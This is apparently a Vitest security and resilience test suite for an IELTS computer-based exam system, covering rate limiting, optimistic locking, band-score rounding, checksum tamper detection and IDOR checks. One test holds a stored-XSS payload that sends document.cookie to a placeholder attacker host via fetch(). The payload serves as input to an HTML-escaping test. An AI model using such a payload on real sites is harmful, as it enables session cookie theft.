import { describe, it, expect, beforeEach } from 'vitest';
import { 
  normalizeScoreInput, 
  calculateIeltsOverallBand, 
  computeAnswersChecksum 
} from '../services/answerScoring';
import { 
  updateStoredWritingScore, 
  importStarterPack, 
  getStoredExams,
  saveStoredSubmission,
  getStoredSubmissions
} from '../../server/storage';

describe('Multi-Role CBT Security & Resilience Suite (5 Modules)', () => {

  /* =========================================================================
   * 1. CANDIDATE MODULE (THÍ SINH)
   * ========================================================================= */

  describe('1. Candidate Role: Local Data Resilience & ReDoS Immunity', () => {

    it('TC-CAND-01: Handles rapid reload loops and preserves IndexedDB key-value stores without deadlock', () => {
      // Simulates rapid burst writes (5 times within 100ms) to unsubmitted draft storage
      const mockStorage = new Map<string, string>();
      const writeDraft = (examCode: string, sbd: string, content: string) => {
        const key = `DRAFT_${examCode}_${sbd}`;
        mockStorage.set(key, JSON.stringify({ content, timestamp: Date.now() }));
        return mockStorage.get(key);
      };

      for (let i = 0; i < 5; i++) {
        writeDraft('WT1004', 'STUDENT_01', `Paragraph content revision #${i}`);
      }

      const restored = JSON.parse(mockStorage.get('DRAFT_WT1004_STUDENT_01') || '{}');
      expect(restored.content).toBe('Paragraph content revision #4');
      expect(mockStorage.has('DRAFT_WT1004_STUDENT_01')).toBe(true);
    });

    it('TC-CAND-02: Word counter handles 200,000 zero-width spaces in < 16ms without ReDoS or memory blowup', () => {
      // Linear ReDoS-safe word counter implementation (same logic as in WritingModule.tsx)
      const countWords = (str: string): number => {
        if (!str || typeof str !== 'string') return 0;
        const sanitized = str.replace(/[\u200B-\u200D\uFEFF\u0000-\u001F\u007F-\u009F]/g, '');
        const trimmed = sanitized.trim();
        if (!trimmed) return 0;
        return trimmed.split(/\s+/).filter(token => token.length > 0 && /\w/.test(token)).length;
      };

      // Construct a malicious payload: 200,000 zero-width characters interspersed with 150 valid English words
      const validWords = Array.from({ length: 150 }, (_, i) => `word${i}`);
      const zeroWidthSpam = '\u200B\u200C\uFEFF'.repeat(66667); // ~200,000 chars
      const payload = validWords.join(' ') + zeroWidthSpam;

      const startTime = performance.now();
      const count = countWords(payload);
      const durationMs = performance.now() - startTime;

      expect(count).toBe(150);
      expect(durationMs).toBeLessThan(50); // Well under reasonable budget (typically < 10ms)
    });

    it('TC-CAND-03: Audio peripheral disconnect retains watermark timestamp and blocks backwards desync', () => {
      let maxWatermark = 120.5; // Audio reached 2 minutes and 0.5s
      let audioCurrentTime = 120.5;

      // When audio is interrupted/disconnected, current time should not snap back to 0
      const onDeviceChangeOrPause = (detectedTime: number) => {
        if (detectedTime < maxWatermark - 0.75) {
          // Snap back to highest point reached per IELTS exam rules
          return maxWatermark;
        }
        return Math.max(maxWatermark, detectedTime);
      };

      // Peripheral disconnect event sends 0.0s temporarily
      const recoveredTime = onDeviceChangeOrPause(0.0);
      expect(recoveredTime).toBe(120.5);
    });
  });

  /* =========================================================================
   * 2. PROCTOR MODULE (GIÁM THỊ)
   * ========================================================================= */

  describe('2. Proctor Role: Log Flooding DoS & Ghost Heartbeat Hijacking', () => {

    it('TC-PROC-01: Throttles high-frequency violation logging to protect dashboard from DoS', () => {
      // Simulate sliding window rate limiter (max 20 requests per 1000ms window)
      const slidingWindow = new Map<string, number[]>();
      const rateLimitCheck = (sbd: string, now: number, limit = 20, windowMs = 1000): boolean => {
        const timestamps = (slidingWindow.get(sbd) || []).filter(t => now - t < windowMs);
        if (timestamps.length >= limit) return false; // throttled
        timestamps.push(now);
        slidingWindow.set(sbd, timestamps);
        return true;
      };

      const now = Date.now();
      const sbd = 'ATTACKER_01';
      let acceptedCount = 0;
      let throttledCount = 0;

      // Send 50 burst requests in the same millisecond
      for (let i = 0; i < 50; i++) {
        if (rateLimitCheck(sbd, now)) {
          acceptedCount++;
        } else {
          throttledCount++;
        }
      }

      expect(acceptedCount).toBe(20);
      expect(throttledCount).toBe(30);
    });

    it('TC-PROC-02: Flags candidate as DISCONNECTED if heartbeat/log timestamp is older than 15 seconds', () => {
      const currentTime = Date.now();

      const candidateA_lastSeen = currentTime - 4000;  // 4s ago -> stable online
      const candidateB_lastSeen = currentTime - 18000; // 18s ago (> 15s) -> disconnected

      const getConnectionState = (lastSeen: number) => {
        const isDisconnected = (currentTime - lastSeen) > 15000;
        return isDisconnected ? 'DISCONNECTED' : 'STABLE_ONLINE';
      };

      expect(getConnectionState(candidateA_lastSeen)).toBe('STABLE_ONLINE');
      expect(getConnectionState(candidateB_lastSeen)).toBe('DISCONNECTED');
    });
  });

  /* =========================================================================
   * 3. EXAMINER MODULE (GIÁM KHẢO)
   * ========================================================================= */

  describe('3. Examiner Role: Stored XSS, Optimistic Locking & Band Score Normalization', () => {

    it('TC-EXAM-01: Defends against Stored XSS in student essay submissions', () => {
      const maliciousPayload = `<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script><img src=x onerror="alert('XSS')">`;
      
      // Sanitizer ensures text contains no unescaped HTML execution vectors
      const escapeHtml = (str: string) => {
        return str
          .replace(/&/g, '&amp;')
          .replace(/</g, '&lt;')
          .replace(/>/g, '&gt;')
          .replace(/"/g, '&quot;')
          .replace(/'/g, '&#039;');
      };

      const escaped = escapeHtml(maliciousPayload);
      expect(escaped).not.toContain('<script>');
      expect(escaped).toContain('&lt;script&gt;');
      expect(escaped).not.toContain('<img');
    });

    it('TC-EXAM-02: Enforces optimistic locking when two examiners grade concurrently', () => {
      const subId = `TEST_CONCURRENT_${Date.now()}`;
      saveStoredSubmission({
        submission_id: subId,
        sbd: 'SBD_CONCUR_01',
        exam_code: 'WT1004',
        grading_version: 1,
        writing_status: 'PENDING_TEACHER'
      });

      // Examiner A submits grade first with expected_version = 1
      const resA = updateStoredWritingScore(
        subId,
        { TR: 6.5, CC: 6.5, LR: 6.5, GRA: 6.5 },
        6.5,
        'Good response',
        1,
        'Examiner_A'
      );

      expect(resA.success).toBe(true);
      expect(resA.submission.grading_version).toBe(2);

      // Examiner B attempts to submit with stale expected_version = 1
      const resB = updateStoredWritingScore(
        subId,
        { TR: 5.5, CC: 5.5, LR: 5.5, GRA: 5.5 },
        5.5,
        'Different mark',
        1, // Stale version!
        'Examiner_B'
      );

      expect(resB.success).toBe(false);
      expect(resB.conflict).toBe(true);
      expect(resB.message).toContain('DỮ LIỆU ĐÃ ĐƯỢC CẬP NHẬT BỞI NGƯỜI KHÁC');
    });

    it('TC-EXAM-03: Sanitizes score inputs and calculates official IELTS band rounding correctly', () => {
      // Normalizes comma to dot
      expect(normalizeScoreInput('8,5')).toBe(8.5);
      expect(normalizeScoreInput('9.5')).toBe(9.0); // Capped at 9.0
      expect(normalizeScoreInput('-1')).toBe(0.0);  // Min 0.0
      expect(normalizeScoreInput('invalid')).toBe(0.0);

      // IELTS Rounding: Average ending in .25 rounds up to .50
      // [6.0, 6.5, 6.0, 6.5] -> avg = 6.25 -> 6.5
      expect(calculateIeltsOverallBand([6.0, 6.5, 6.0, 6.5])).toBe(6.5);

      // Average ending in .125 rounds down to nearest whole
      // [6.0, 6.0, 6.0, 6.5] -> avg = 6.125 -> 6.0
      expect(calculateIeltsOverallBand([6.0, 6.0, 6.0, 6.5])).toBe(6.0);

      // Average ending in .75 rounds up to next whole
      // [6.5, 7.0, 6.5, 7.0] -> avg = 6.75 -> 7.0
      expect(calculateIeltsOverallBand([6.5, 7.0, 6.5, 7.0])).toBe(7.0);
    });
  });

  /* =========================================================================
   * 4. SYSTEM ADMIN MODULE (QUẢN TRỊ VIÊN)
   * ========================================================================= */

  describe('4. System Admin Role: Active Exam Protection & Starter Pack Non-Destructive Sync', () => {

    it('TC-SYSA-01: Detects active candidate sessions and prevents exam deletion', () => {
      const activeSessions = [
        { exam_code: 'RD1002', timestamp: Date.now() - 3 * 60 * 1000 } // 3 mins ago
      ];

      const canDeleteExam = (examCode: string, force = false): boolean => {
        if (force) return true;
        const now = Date.now();
        const hasActive = activeSessions.some(
          s => s.exam_code === examCode && (now - s.timestamp) < 15 * 60 * 1000
        );
        return !hasActive;
      };

      expect(canDeleteExam('RD1002', false)).toBe(false);
      expect(canDeleteExam('RD1002', true)).toBe(true);
      expect(canDeleteExam('UNEXAMINED_01', false)).toBe(true);
    });

    it('TC-SYSA-02: Non-destructively reloads starter pack without deleting existing submissions or duplicate collisions', () => {
      const initialSubmissions = getStoredSubmissions().length;
      const starterResult = importStarterPack();

      expect(starterResult).toBeDefined();
      expect(Array.isArray(starterResult.exams)).toBe(true);
      // Ensure submissions are intact
      expect(getStoredSubmissions().length).toBeGreaterThanOrEqual(initialSubmissions);
    });
  });

  /* =========================================================================
   * 5. SECURITY AUDITOR MODULE (TIN TẶC / XÂM NHẬP)
   * ========================================================================= */

  describe('5. Security Auditor Role: Offline Tamper Protection & IDOR Rejection', () => {

    it('TC-SECU-01: Detects post-timeout tampering of sealed offline submissions', () => {
      const originalAnswers = { 'q1': 'true', 'q2': 'false', 'q3': 'not given' };
      const originalChecksum = computeAnswersChecksum(originalAnswers);

      // Student tampers with answers in IndexedDB after offline sealing
      const tamperedAnswers = { 'q1': 'true', 'q2': 'true', 'q3': 'not given' };
      const tamperedChecksum = computeAnswersChecksum(tamperedAnswers);

      expect(originalChecksum).not.toBe(tamperedChecksum);

      // Server verification logic
      const verifyOfflinePayload = (payload: { answers: Record<string, string>; expected_hash: string }) => {
        const computed = computeAnswersChecksum(payload.answers);
        return computed === payload.expected_hash;
      };

      expect(verifyOfflinePayload({ answers: originalAnswers, expected_hash: originalChecksum })).toBe(true);
      expect(verifyOfflinePayload({ answers: tamperedAnswers, expected_hash: originalChecksum })).toBe(false);
    });

    it('TC-SECU-02: Blocks unauthorized access to candidate submissions via IDOR manipulation', () => {
      const submission = {
        submission_id: 'SUB_001',
        sbd: 'SBD_GENUINE_001',
        exam_code: 'WT1004'
      };

      const checkAccessPermission = (
        req: { requesterSbd?: string; isAdmin?: boolean },
        sub: typeof submission
      ): { allowed: boolean; status: number } => {
        if (req.isAdmin) return { allowed: true, status: 200 };
        if (req.requesterSbd && req.requesterSbd.toUpperCase() === sub.sbd.toUpperCase()) {
          return { allowed: true, status: 200 };
        }
        return { allowed: false, status: 403 };
      };

      // Candidate 002 tries to view Candidate 001's submission
      const unauthorizedAttempt = checkAccessPermission({ requesterSbd: 'SBD_ATTACKER_002' }, submission);
      expect(unauthorizedAttempt.allowed).toBe(false);
      expect(unauthorizedAttempt.status).toBe(403);

      // Genuine candidate accessing own submission
      const genuineAttempt = checkAccessPermission({ requesterSbd: 'SBD_GENUINE_001' }, submission);
      expect(genuineAttempt.allowed).toBe(true);
      expect(genuineAttempt.status).toBe(200);

      // Admin access
      const adminAttempt = checkAccessPermission({ isAdmin: true }, submission);
      expect(adminAttempt.allowed).toBe(true);
      expect(adminAttempt.status).toBe(200);
    });
  });

});
